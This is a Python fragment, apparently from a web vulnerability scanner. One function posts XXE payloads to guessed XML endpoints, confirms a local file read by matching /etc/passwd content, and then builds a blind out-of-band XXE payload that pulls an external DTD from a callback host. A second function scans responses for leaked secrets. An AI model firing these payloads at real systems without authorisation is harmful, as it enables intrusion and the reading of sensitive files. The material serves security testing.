def scan_xxe_post(base: str) -> ScanFindings:
    out: ScanFindings = []
    static_paths = [
        "/api", "/api/xml", "/api/v1/xml", "/soap", "/rpc",
        "/upload", "/import", "/parse", "/convert",
        "/v2/xml", "/services", "/ws",
    ]
    targets = [base] + [_join_url(base, p) for p in static_paths]
    for ep in _DISCOVERED_ENDPOINTS:
        if any(k in ep.lower() for k in ("xml", "soap", "rpc", "upload", "import", "parse", "convert", "ws", "service")):
            targets.append(ep)
    seen: set = set()
    for u in targets:
        if u in seen:
            continue
        seen.add(u)
        try:
            c, _, b, _ = _req(u, method="POST", data=_XXE_BODY, content_type="application/xml", timeout=10.0)
            if b"root:x:0:0" in b[:50000] or b"root:*:0:0" in b[:50000]:
                out.append(("[CONFIRMED] XXE local file read via XML POST", u))
                return out
        except Exception:
            pass
    if not out:
        token = "xxe" + hashlib.md5(os.urandom(6)).hexdigest()[:8]
        cb = oob_url(token, base)
        if cb:
            oob_clear(token)
            dtd_url = cb.rstrip("/") + ".dtd"
            oob_xxe_body = (
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "' + dtd_url + '">'
                '%remote;]><foo>&send;</foo>'
            ).encode()
            for u in list(seen)[:5]:
                try:
                    _req(u, method="POST", data=oob_xxe_body, content_type="application/xml", timeout=6.0)
                except Exception:
                    pass
            hits = oob_wait(token, timeout=6.0)
            for hit in hits:
                out.append(("[CONFIRMED] blind XXE OOB callback received",
                            "path=" + str(hit.get("path", "")) + " src=" + str(hit.get("src", ""))))
    return out

def scan_secrets_in_response(base: str) -> ScanFindings:
    code, _, body, _ = _req(base)
    if code != 200:
        return []
    text = body.decode("utf-8", "ignore")
    out: ScanFindings = []
    for rx, label in _SECRET_PATTERNS:
        mo = rx.search(text)
        if mo:
            frag = mo.group(0)
            if len(frag) > 64:
                frag = frag[:64] + "..."
            out.append(("response may contain leaked " + label, frag))
    return out

